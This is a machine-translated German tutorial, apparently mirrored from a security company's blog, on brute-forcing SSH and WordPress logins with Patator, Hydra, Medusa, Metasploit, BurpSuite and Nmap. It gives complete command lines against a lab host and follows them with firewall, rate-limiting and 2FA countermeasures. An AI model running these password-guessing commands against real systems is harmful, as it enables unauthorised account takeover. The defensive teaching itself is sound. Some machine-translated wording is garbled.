<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üé∑ ü§º üòç Brute-Force-Angriffe mit Kali Linux üè∏ ü§∏ üé¨</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Brute-Force (Brute-Force-Angriff) ist eine Methode zur L√∂sung mathematischer Probleme, deren Komplexit√§t von der Anzahl aller m√∂glichen L√∂sungen abh√§n...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Brute-Force-Angriffe mit Kali Linux</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pentestit/blog/434216/"><img src="https://habrastorage.org/webt/zv/o2/x0/zvo2x0ojtk15u7uwaecj7kdpc-u.jpeg"><br><br>  Brute-Force (Brute-Force-Angriff) ist eine Methode zur L√∂sung mathematischer Probleme, deren Komplexit√§t von der Anzahl aller m√∂glichen L√∂sungen abh√§ngt.  Der Begriff Brute-Force selbst wird normalerweise im Zusammenhang mit Hackerangriffen verwendet, wenn ein Angreifer versucht, einen Benutzernamen / ein Kennwort f√ºr ein Konto oder einen Dienst abzurufen. <br><br>  Betrachten Sie die Tools, mit denen Sie Brute-Force-Angriffe auf SSH- und WEB-Dienste ausf√ºhren k√∂nnen, die in Kali Linux (Patator, Medusa, Hydra, Metasploit) sowie in BurpSuite verf√ºgbar sind. <br><a name="habracut"></a><br><blockquote>  Alle in diesem Artikel bereitgestellten Materialien sind nur f√ºr Bildungszwecke bestimmt.  Die Verwendung von Materialien in rechtswidriger und illegaler Form ist verboten. <br></blockquote><br><h2>  Brute-Force-SSH </h2><br>  Nehmen Sie beispielsweise den Testcomputer 192.168.60.50 und versuchen Sie, das Kennwort des Benutzertests per SSH zu ermitteln.  Wir werden g√§ngige Passw√∂rter aus dem Standardw√∂rterbuch rockyou.txt verwenden. <br><br><hr><br>  <b>Patator</b> <br>  Verwenden Sie den folgenden Befehl, um ein Kennwort mit Patator auszuw√§hlen: <br><br> <code>patator ssh_login host=192.168.60.50 user=test password=FILE0 0=/root/wordlist -x ignore:mesg='Authentication failed'</code> <br> <br>  wo: <br>  <b>ssh_login</b> - erforderliches Modul <br>  <b>Gastgeber</b> ist unser Ziel <br>  <b>Benutzer</b> - <b>Benutzeranmeldung</b> , bei der ein Kennwort oder eine Datei mit Anmeldungen zur Mehrfachauswahl ausgew√§hlt wird <br>  <b>Passwort</b> - W√∂rterbuch mit Passw√∂rtern <br>  <b>-x ignore: mesg = 'Authentifizierung fehlgeschlagen'</b> - Der Befehl zeigt keine Zeile mit dieser Nachricht an.  Der Filterparameter wird individuell ausgew√§hlt. <br><br><img src="https://habrastorage.org/webt/yk/9s/qg/yk9sqghqquqm8814u0jh7sgonac.png" alt="Bild"><br><br><hr><br>  <b>Hydra</b> <br>  F√ºhren Sie den folgenden Befehl aus, um mit Hydra ein Kennwort auszuw√§hlen: <br><br> <code>hydra -V -f -t 4 -l test -P /root/wordlist ssh://192.168.60.50</code> <br> <br>  wo: <br>  <b>-V</b> - Zeigt w√§hrend der Iteration ein Paar Benutzername + Passwort an <br>  <b>-f</b> - Stopp, sobald das Passwort f√ºr das angegebene Login gefunden wurde <br>  <b>-P</b> - Pfad zum W√∂rterbuch mit Passw√∂rtern <br>  <b>ssh: //192.168.60.50</b> - Dienstanzeige und IP-Adresse des Opfers <br><br><img src="https://habrastorage.org/webt/ys/qd/xv/ysqdxvgtpatu8to2q_lmdrzp9y0.png" alt="Bild"><br><br><hr><br>  <b>Medusa</b> <br>  F√ºhren Sie den folgenden Befehl aus, um ein Kennwort mit Medusa auszuw√§hlen: <br><br> <code>medusa -h 192.168.60.50 -u test -P /root/wordlist -M ssh -f -v 6</code> <br> <br>  wo: <br>  <b>-h</b> - IP-Adresse des Opfers <br>  <b>-u</b> - Login <br>  <b>-P</b> - W√∂rterbuchpfad <br>  <b>-M</b> - Modulauswahl <br>  <b>-f</b> - Stopp, nachdem ein g√ºltiges Paar aus Benutzername und Passwort gefunden wurde <br>  <b>-v -</b> Einstellen der Anzeige von Nachrichten auf dem Bildschirm w√§hrend des Auswahlprozesses <br><br><img src="https://habrastorage.org/webt/p_/i4/df/p_i4dfjf697ssbosu6f1fxzj0qk.png" alt="Bild"><br><br><hr><br>  <b>Metasploit</b> <br>  Wir werden nach einem Tool suchen, mit dem Brute-Force-Angriffe auf SSH durchgef√ºhrt werden k√∂nnen: <br>  <code>search ssh_login</code> und <code>search ssh_login</code> die Antwort: <br><br><img src="https://habrastorage.org/webt/z1/kz/s3/z1kzs3syz3jdf7jcpjnxzj37d5y.png" alt="Bild"><br><br>  Wir verwenden das Modul: <br><br> <code>use auxiliary/scanner/ssh/ssh_login</code> <br> <br>  Verwenden Sie den Befehl <code>show options</code> , um die erforderlichen Parameter anzuzeigen.  F√ºr uns ist es: <br>  <b>Rhosts</b> - IP-Adresse des Opfers <br>  <b>rport</b> - port <br>  <b>Benutzername</b> - SSH-Login <br>  <b>userpass_file</b> - Pfad zum W√∂rterbuch <br>  <b>stop_on_success</b> - Stopp, sobald ein Benutzername / Passwort-Paar vorhanden ist <br>  <b>Threads</b> - Anzahl der Threads <br><br><img src="https://habrastorage.org/webt/yl/jd/tn/yljdtnsmzwi4663yl4swbrvg8zg.png" alt="Bild"><br><br>  Die Anzeige der notwendigen Parameter erfolgt √ºber den Befehl " <b>set</b> ". <br><br> <code>set rhosts 192.168.60.50</code> <br> <code>set username test <br> set userpass_file /root/wordlist <br> set stop_on_success yes <br> set threads 4 <br> set rport 22</code> <br> <br>  Nachdem wir die erforderlichen Parameter angegeben haben, geben wir den Befehl " <b>run</b> " ein und warten. <br><br><img src="https://habrastorage.org/webt/8h/wp/nt/8hwpnt8bls7vuuv0knw86hx-kby.png" alt="Bild"><br><br><h3>  Gegenwirkung </h3><br>  Begrenzen Sie die Anzahl der hergestellten Verbindungen mithilfe einer Firewall.  Beispiel f√ºr die Einrichtung von iptables: <br><br>  <code>-A INPUT -i eth0 -p tcp --dport 22 -m connlimit --connlimit-above 1 --connlimit-mask 32 -j REJECT --reject-with tcp-reset</code> . <br><br>  Eine solche Regel beschr√§nkt den Zugriff auf SSH f√ºr jede IP-Adresse auf 1 Verbindung pro Sekunde, was die Suche erheblich erschwert.  Eine effektive L√∂sung kann auch die Verwendung der Zwei-Faktor-Authentifizierung (z. B. mithilfe von eToken) oder die Authentifizierung mithilfe eines Schl√ºsselpaars sowie die Verwendung von ACLs sein, die auf IP-Adressen basieren. <br><br><h2>  Brute-Force-WordPress </h2><br>  Schauen wir uns ein anderes Beispiel an - die Auswahl eines Kennworts f√ºr ein Webformular-Autorisierungsfenster. <br><br><img src="https://habrastorage.org/webt/sv/lo/oi/svlooiyalsm5q11pt3pslw_1cqo.png" alt="Bild"><br><br>  Zum Beispiel werden wir das Passwort aus dem WordPress-Administratorkonto ausw√§hlen. <br><br><hr><br>  <b>Burpsuite</b> <br>  Zun√§chst m√ºssen wir verstehen, wie der Autorisierungsprozess abl√§uft.  Daf√ºr verwenden wir BurpSuite.  Wir m√ºssen versuchen, uns mit einem beliebigen Passwort anzumelden und uns anzumelden, um zu sehen, welche Anforderungen √ºber BurpSuite gesendet werden. <br><br><img src="https://habrastorage.org/webt/gb/zo/2c/gbzo2cqqvnl3tuxwcpbbujk1zgs.png" alt="Bild"><br><br>  Nun, wir haben eine POST-Autorisierungsanfrage gesehen, wir werden damit arbeiten. <br>  BODY gibt an, welche Anmeldung und welches Passwort √ºberpr√ºft wurden. Dies bedeutet, dass wir versuchen k√∂nnen, die ben√∂tigten Werte selbst zu ersetzen. <br>  Wir leiten diese Anfrage an Intruder weiter und w√§hlen dort die notwendigen Parameter f√ºr den Angriff aus.  Im Element Payload Positions belassen wir den Angriffstyp als Scharfsch√ºtzen, zur √úberpr√ºfung belassen wir jedoch nur den Parameter pwd.  Ein Angriff √§ndert also nur diesen Parameter. <br><br><img src="https://habrastorage.org/webt/ru/a4/oi/rua4oiu-gz5hilmjujvajblxgs8.png" alt="Bild"><br><br>  Wir laden das notwendige W√∂rterbuch und beginnen den Angriff. <br><br><img src="https://habrastorage.org/webt/qf/dw/dt/qfdwdtl1-e6gohgyhzsllu-dny8.png" alt="Bild"><br><br>  Aus dem Verhalten der Webanwendung geht hervor, dass das falsche Kennwort den Antwortcode 200 zur√ºckgibt. Nach dem Aufz√§hlen des W√∂rterbuchs sehen wir, dass eines der Kennw√∂rter die Antwort mit dem Code 302 gegeben hat - es ist korrekt. <br><br><img src="https://habrastorage.org/webt/lf/cz/tz/lfcztzibwkvx8rrppdbfs3li-ny.png" alt="Bild"><br><br>  Diese Brute-Force-Methode dauert viel l√§nger als bei Verwendung von Patator, Hydra, Medusa usw.  Obwohl wir ein kleines W√∂rterbuch genommen haben, hat BurpSuite das W√∂rterbuch etwa 40 Minuten lang durchlaufen. <br><br><hr><br>  <b>Hydra</b> <br>  Versuchen wir, das Passwort mit Hydra zu finden. <br>  Wie wir bereits wissen, wird bei falscher Autorisierung der Code 200 zur√ºckgegeben, und bei Erfolg lautet der Code 302. Versuchen wir, diese Informationen zu verwenden. <br>  Verwenden Sie zum Starten den folgenden Befehl: <br><br> <code>hydra -V -f -l admin -P /root/wordlist -t 4 http-post-form://192.168.60.50 -m "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1:S=302"</code> <br> <br>  Hier geben wir die erforderlichen Parameter an: <br>  <b>-l</b> - Benutzername <br>  <b>-P</b> - W√∂rterbuch mit Passw√∂rtern <br>  <b>-t</b> - Anzahl der Threads <br>  <b>http-post-form</b> - Art des Formulars, wir haben POST. <br>  <b>/wp-login.php</b> ist die URL der Autorisierungsseite <br>  <b>^ USER ^</b> - zeigt an, wo der Benutzername ersetzt werden soll <br>  <b>^ PASS ^</b> - zeigt an, wo das Passwort aus dem W√∂rterbuch ersetzt werden soll <br>  <b>S = 302</b> - ein Hinweis darauf, welche Antwort auf Hydra zu verlassen ist.  In unserem Fall lautet die Antwort nach erfolgreicher Autorisierung 302. <br><br><img src="https://habrastorage.org/webt/jd/ft/yp/jdftypn_8za5oyqcdattmnwcwce.png" alt="Bild"><br><br><hr><br>  <b>Patator</b> <br>  Wie wir bereits wissen, wird bei fehlgeschlagener Autorisierung der Code 200 zur√ºckgegeben, und bei Erfolg wird 302 zur√ºckgegeben. Wir verwenden dasselbe Prinzip wie bei Hydra: <br>  Der Start wird mit dem folgenden Befehl ausgef√ºhrt: <br><br> <code>patator http_fuzz url=http://192.168.60.50/wp-login.php method=POST body='log=admin&amp;pwd=FILE0&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1' 0=/root/wordlist -t 4 before_urls=http://192.168.60.50/wp-login.php -x ignore:code=200 accept_cookie=1</code> <br> <br>  <b>http_fuzz</b> - Modul f√ºr Brute-Force-HTTP-Angriffe <br>  <b>URL</b> - Adresse der Seite mit Autorisierung <br>  <b>FILE0</b> - Pfad zum W√∂rterbuch mit Passw√∂rtern <br>  <b>body</b> - Informationen, die w√§hrend der Autorisierung in der POST-Anforderung √ºbertragen werden <br>  <b>-t</b> - Anzahl der Threads <br>  <b>-x</b> - In diesem Fall haben wir den Befehl angegeben, keine Nachrichtenzeilen anzuzeigen, die einen Parameter mit dem Code 200 enthalten <br>  <b>accept_cookie</b> - Cookie-Parameter speichern und an die n√§chste Anfrage √ºbergeben <br>  Infolgedessen konnten wir ein Passwort finden. <br><br><img src="https://habrastorage.org/webt/m0/el/tw/m0eltwkb6kp6d2joca248ceof2o.png" alt="Bild"><br><br><hr><br>  <b>Nmap</b> <br>  Das Dienstprogramm Nmap erm√∂glicht unter anderem die Auswahl von Kennw√∂rtern f√ºr Webautorisierungsformulare, wenn Sie das Skript <b>http-wordpress-brute</b> mit den entsprechenden Argumenten verwenden: <br>  <b>--script-args</b> - Argumente hinzuf√ºgen <br>  <b>user</b> oder <b>userdb</b> - Login oder Datei mit Logins <br>  <b>pass</b> oder <b>passdb</b> - <b>Geben Sie</b> ein Passwort oder ein W√∂rterbuch an <br>  <b>thread</b> - Anzahl der Threads <br>  <b>firstonly = true</b> - <b>Zeigt</b> das Ergebnis nach dem ersten richtigen Passwort an <br><br> <code>nmap 192.168.60.50 --script http-wordpress-brute --script-args 'user= admin,passdb= /root/wordlist, http-wordpress-brute.thread=3, brute.firstonly=true'</code> <br> <br><img src="https://habrastorage.org/webt/kj/-k/dn/kj-kdnrb0qxnjem-x4rfrebahxa.png" alt="Bild"><br><br><h3>  Gegenwirkung </h3><br>  Begrenzen Sie (komplizierte) Brute-Force-Angriffe auf Webanwendungen mithilfe von iptables (√§hnlich wie SSH) und nginx.  Erstellen Sie dazu eine Grenzzone: <br> <code>... <br> limit_req_zone $binary_remote_addr zone=req_limits:10m rate=30r/s; <br> ... <br></code> <br>  und benutze es: <br> <code>location / { <br> ... <br> limit_req zone=req_limits burst=10; <br> limit_req_status 429; <br> ... <br> } <br></code> <br>  Durch diese Einstellungen wird die Anzahl der Anforderungen von einer IP-Adresse auf 40 pro Sekunde begrenzt. <br><br>  Um die Aufz√§hlungsaufgabe zu verkomplizieren, k√∂nnen Sie die folgenden Methoden verwenden: <br>  - Verwendung einer Firewall und anderer Software, um die Anzahl der Anrufe an den gesch√ºtzten Dienst zu begrenzen.  In einem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel</a> erfahren Sie, wie wir maschinelles Lernen verwenden, um solche Angriffe (einschlie√ülich verteilter Angriffe) zu erkennen. <br>  - Verwendung von Tools, die eine schnelle √úberpr√ºfung der Richtigkeit des Schl√ºssels verhindern (z. B. Captcha). <br><br><h2>  Fazit </h2><br>  In diesem Artikel haben wir einige beliebte Tools oberfl√§chlich untersucht.  Sie k√∂nnen das Risiko des Erraten von Passw√∂rtern verringern, indem Sie die folgenden Richtlinien befolgen: <br>  - Verwenden Sie passwortsichere Passw√∂rter. <br>  - Erstellen Sie keine Passw√∂rter mit pers√∂nlichen Informationen, zum Beispiel: Geburtsdatum oder Name + Geburtsdatum oder Mobiltelefon; <br>  - das Passwort regelm√§√üig √§ndern; <br>  - Verwenden Sie f√ºr alle Konten eindeutige Kennw√∂rter. <br><br>  Nur wenige Menschen befolgen solche Empfehlungen (sowie Empfehlungen f√ºr eine sichere Webentwicklung). Daher m√ºssen Sie verschiedene Softwarel√∂sungen verwenden, mit denen Sie: <br>  - die Verbindung nach IP-Adresse einschr√§nken oder, falls dies nicht m√∂glich ist, die gleichzeitige Anzahl von Verbindungen zum Dienst begrenzen (unter Verwendung von iptables, nginx und anderen); <br>  - Zwei-Faktor-Authentifizierung verwenden; <br>  - Erkennen und blockieren Sie solche Angriffe mit SIEM, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">WAF</a> oder anderen (z. B. fail2ban). </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de434216/">https://habr.com/ru/post/de434216/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de434206/index.html">Jet Distributor ok.ru/music</a></li>
<li><a href="../de434208/index.html">How Go rettete unseren schwarzen Freitag</a></li>
<li><a href="../de434210/index.html">Analyse des Android-Quizwettbewerbs vom HeadHunter-Stand auf der Mobius 2018 in Moskau</a></li>
<li><a href="../de434212/index.html">Tesla Tower. Was passiert in und in der N√§he eines Wolkenkratzers, wenn ein Blitz einschl√§gt?</a></li>
<li><a href="../de434214/index.html">Java Dynamic Proxy: Was ist das und wie wird es verwendet?</a></li>
<li><a href="../de434218/index.html">Einfacher Java Clicker Bot am Beispiel des Spiels World of Warcraft 3.3.5a</a></li>
<li><a href="../de434220/index.html">Aeronet betreten: Starten eines autonomen Quadrocopters in einer virtuellen Umgebung</a></li>
<li><a href="../de434222/index.html">Amazon Bodenstation zu vermieten - empfangen und verarbeiten Sie Daten von Satelliten</a></li>
<li><a href="../de434224/index.html">Digitale Veranstaltungen in Moskau vom 24. bis 30. Dezember</a></li>
<li><a href="../de434226/index.html">Habrautilit√§t zum Sammeln von Habrastatistiken in Habrablogs</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>